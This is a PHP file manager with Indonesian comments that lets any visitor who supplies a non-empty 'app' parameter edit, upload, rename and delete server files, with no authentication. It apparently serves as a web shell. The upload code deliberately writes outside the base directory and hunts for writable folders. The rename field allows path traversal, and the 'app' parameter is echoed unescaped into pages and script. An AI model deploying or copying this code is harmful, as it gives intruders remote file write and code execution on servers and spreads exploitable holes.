<?php
if (!isset($_GET['app']) || empty($_GET['app'])) {
    http_response_code(403);
    exit('🛑 Missing "app" parameter.');
}
?>
<style>
.breadcrumb {
    background-color: #f8f9fa;
    padding: 10px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.breadcrumb a {
    color: #007bff;
    text-decoration: none;
    padding: 2px 5px;
    border-radius: 3px;
    transition: all 0.2s ease;
}
.breadcrumb a:hover {
    background-color: #e9ecef;
    text-decoration: underline;
    transform: scale(1.05);
}
.breadcrumb a:active {
    background-color: #007bff;
    color: white;
}
.upload-section {
    background-color: #f8f9fa;
    padding: 15px;
    border-radius: 5px;
    margin: 10px 0;
    border: 1px solid #dee2e6;
}
.file-table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}
.file-table th, .file-table td {
    border: 1px solid #dee2e6;
    padding: 8px;
    text-align: left;
}
.file-table th {
    background-color: #e9ecef;
}
.breadcrumb .separator {
    color: #6c757d;
    margin: 0 5px;
}
.path-link {
    display: inline-block;
    margin: 2px;
}
.path-link.current {
    background-color: #007bff;
    color: white;
    padding: 2px 5px;
    border-radius: 3px;
    font-weight: bold;
}
</style>
<?php

// Default path = current dir
$baseDir = getcwd(); 
$path = isset($_GET['dir']) ? realpath($_GET['dir']) : $baseDir;

// Prevent path traversal keluar baseDir
if ($path === false || strpos($path, $baseDir) !== 0) {
    $path = $baseDir;
}

// Editing file
if (isset($_GET['file']) && !empty($_GET['file'])) {
    $filepath = realpath($path . DIRECTORY_SEPARATOR . $_GET['file']);
    if ($filepath === false || strpos($filepath, $baseDir) !== 0) {
        exit("❌ Invalid file path");
    }

    if (isset($_POST['edit'])) {
        file_put_contents($filepath, $_POST['content']);
        echo "<script>window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "';</script>";
        exit;
    }
    echo "<h2>Editing: " . htmlspecialchars(basename($filepath)) . "</h2>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>";
    echo htmlspecialchars(file_get_contents($filepath));
    echo "</textarea><br><button type='submit' name='edit'>Save</button></form>";
    exit;
}

// Upload
if (isset($_FILES['upload'])) {
    // SELALU upload ke parent directory, mundur 1 tingkat dari current path
    $uploadDir = dirname($path);
    
    // Jika hasil dirname sama dengan current path (berarti sudah di root), 
    // tetap gunakan parent directory yang ada
    if ($uploadDir === $path) {
        $uploadDir = $baseDir; // fallback ke base directory
    }
    
    $uploadPath = $uploadDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    
    // Debug info 
    echo "<p>DEBUG INFO:</p>";
    echo "Current path: " . $path . "<br>";
    echo "Upload dir (mundur 1): " . $uploadDir . "<br>";
    
    // Jika tidak writable, cari folder writable dengan masuk ke dalam subfolder
    if (!is_writable($uploadDir)) {
        echo "Upload dir tidak writable, scan subfolder untuk cari yang writable...<br>";
        
        $foundWritableDir = null;
        
        // Scan semua subfolder di upload directory
        if (is_dir($uploadDir)) {
            $subfolders = scandir($uploadDir);
            echo "Scanning folders di: {$uploadDir}<br>";
            
            foreach ($subfolders as $subfolder) {
                if ($subfolder === '.' || $subfolder === '..') continue;
                
                $fullSubPath = $uploadDir . DIRECTORY_SEPARATOR . $subfolder;
                
                if (is_dir($fullSubPath)) {
                    echo "- Checking folder: {$subfolder} -> ";
                    
                    if (is_writable($fullSubPath)) {
                        echo "<strong>WRITABLE! ✅</strong><br>";
                        $foundWritableDir = $fullSubPath;
                        break; // Stop di folder writable pertama yang ditemukan
                    } else {
                        echo "tidak writable ❌<br>";
                    }
                }
            }
        }
        
        if ($foundWritableDir) {
            $uploadDir = $foundWritableDir;
            echo "<strong>FOUND WRITABLE FOLDER! Upload akan ke: {$uploadDir}</strong><br>";
        } else {
            echo "<strong>ERROR: Tidak ditemukan subfolder yang writable di {$uploadDir}!</strong><br>";
            // Fallback: tetap coba upload ke directory asli
        }
    } else {
        echo "Upload dir writable!<br>";
    }
    
    $uploadPath = $uploadDir . DIRECTORY_SEPARATOR . $_FILES['upload']['name'];
    echo "Final upload path: " . $uploadPath . "<br>";
    
    // Check if upload directory is writable (final check)
    if (!is_writable($uploadDir)) {
        echo "<script>alert('Error: Upload directory " . $uploadDir . " is not writable! Permission denied.');</script>";
    } else {
        // Try to move uploaded file
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath)) {
            // Success - redirect using JavaScript to avoid header issues
            echo "<script>window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($uploadDir) . "';</script>";
            exit;
        } else {
            echo "<script>alert('Error: Failed to upload file to " . $uploadDir . "! Check permissions.');</script>";
        }
    }
}

// Rename
if (isset($_GET['rename']) && isset($_POST['newname'])) {
    $old = realpath($path . DIRECTORY_SEPARATOR . $_GET['rename']);
    $new = $path . DIRECTORY_SEPARATOR . $_POST['newname'];
    if ($old && strpos($old, $baseDir) === 0) {
        if (rename($old, $new)) {
            echo "<script>window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "';</script>";
        } else {
            echo "<script>alert('Error: Failed to rename file!');</script>";
        }
    }
    exit;
}

// Delete
if (isset($_GET['delete'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if ($target && strpos($target, $baseDir) === 0) {
        $success = false;
        if (is_dir($target)) {
            $success = rmdir($target);
        } else {
            $success = unlink($target);
        }
        
        if ($success) {
            echo "<script>window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "';</script>";
        } else {
            echo "<script>alert('Error: Failed to delete file/folder!');</script>";
        }
    }
    exit;
}

// Create new folder
if (isset($_POST['newfolder']) && !empty($_POST['foldername'])) {
    $newFolder = $path . DIRECTORY_SEPARATOR . $_POST['foldername'];
    if (!file_exists($newFolder)) {
        if (mkdir($newFolder)) {
            echo "<script>window.location.href = '?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "';</script>";
        } else {
            echo "<script>alert('Error: Failed to create folder! Check permissions.');</script>";
        }
    } else {
        echo "<script>alert('Error: Folder already exists!');</script>";
    }
    exit;
}

echo "<h2>File Manager</h2>";

// tampilkan current path dengan breadcrumb navigation
echo "<div class='breadcrumb'>";
echo "<b>📁 Path:</b> ";

// Metode alternatif: bangun path dari current ke root, lalu reverse
$pathArray = [];
$tempPath = $path;

// Bangun array path dari current directory ke root
while ($tempPath !== $baseDir && strlen($tempPath) > strlen($baseDir)) {
    $pathArray[] = [
        'name' => basename($tempPath),
        'fullPath' => $tempPath
    ];
    $tempPath = dirname($tempPath);
}

// Tambahkan base directory
$pathArray[] = [
    'name' => basename($baseDir),
    'fullPath' => $baseDir
];

// Reverse untuk urutan dari root ke current
$pathArray = array_reverse($pathArray);

// Tampilkan breadcrumb
foreach ($pathArray as $index => $pathInfo) {
    if ($index > 0) {
        echo "<span class='separator'> / </span>";
    }
    
    // Jika ini current directory, highlight
    if ($pathInfo['fullPath'] === $path) {
        echo "<span class='path-link current'>" . htmlspecialchars($pathInfo['name']) . "</span>";
    } else {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($pathInfo['fullPath']) . "' class='path-link'>" . htmlspecialchars($pathInfo['name']) . "</a>";
    }
}
echo "<br><small><b>Full Path:</b> " . htmlspecialchars($path) . "</small>";

// Tombol Up untuk naik satu level
if ($path !== $baseDir) {
    $parentDir = dirname($path);
    echo "<br><a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parentDir) . "' class='path-link' style='background-color: #28a745; color: white; margin-top: 5px;'>⬆️ Up One Level</a>";
}

echo "</div>";

// tombol upload dan create folder
echo "<div class='upload-section'>";
echo "<h3>📤 Upload File</h3>";

// Show where file will be uploaded
$uploadTargetDir = ($path === $baseDir) ? $baseDir : dirname($path);
$uploadTargetName = basename($uploadTargetDir);

if ($path !== $baseDir) {
    echo "<p><small>File akan diupload ke parent directory: <strong>../{$uploadTargetName}/</strong></small></p>";
    echo "<p><small>Full upload path: <strong>" . htmlspecialchars($uploadTargetDir) . "/</strong></small></p>";
} else {
    echo "<p><small>File akan diupload ke root directory: <strong>" . htmlspecialchars($baseDir) . "/</strong></small></p>";
}

echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload' required>
    <button type='submit'>Upload to Parent Directory (../)</button>
</form>";
echo "<br>";
echo "<h3>📁 Create New Folder</h3>";
echo "<form method='post'>
    <input type='text' name='foldername' placeholder='Enter folder name' required>
    <button type='submit' name='newfolder'>Create Folder</button>
</form>";
echo "</div>";

// List files
$files = scandir($path);
echo "<h3>📂 Directory Contents</h3>";
echo "<table class='file-table'><tr><th>📄 File/Folder</th><th>⚙️ Actions</th></tr>";

// tombol kembali ke parent folder
if ($path !== $baseDir) {
    $parent = dirname($path);
    echo "<tr><td><a href='?app=" . $_GET['app'] . "&dir=" . urlencode($parent) . "'>📁 .. (Back to Parent)</a></td><td>-</td></tr>";
}

foreach ($files as $file) {
    if ($file === '.' || $file === '..') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    echo "<tr><td>";
    if (is_dir($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($full) . "'>📁 " . htmlspecialchars($file) . "</a>";
    } else {
        echo "📄 " . htmlspecialchars($file);
    }
    echo "</td><td>";
    if (is_file($full)) {
        echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&file=" . urlencode($file) . "'>✏️ Edit</a> | ";
    }
    echo "<form style='display:inline' method='post' action='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&rename=" . urlencode($file) . "'>
        <input name='newname' value='" . htmlspecialchars($file) . "' style='width:100px;'>
        <button type='submit'>🏷️ Rename</button>
    </form> | ";
    echo "<a href='?app=" . $_GET['app'] . "&dir=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"Delete " . htmlspecialchars($file) . "?\")'>🗑️ Delete</a>";
    echo "</td></tr>";
}
echo "</table>";
?>
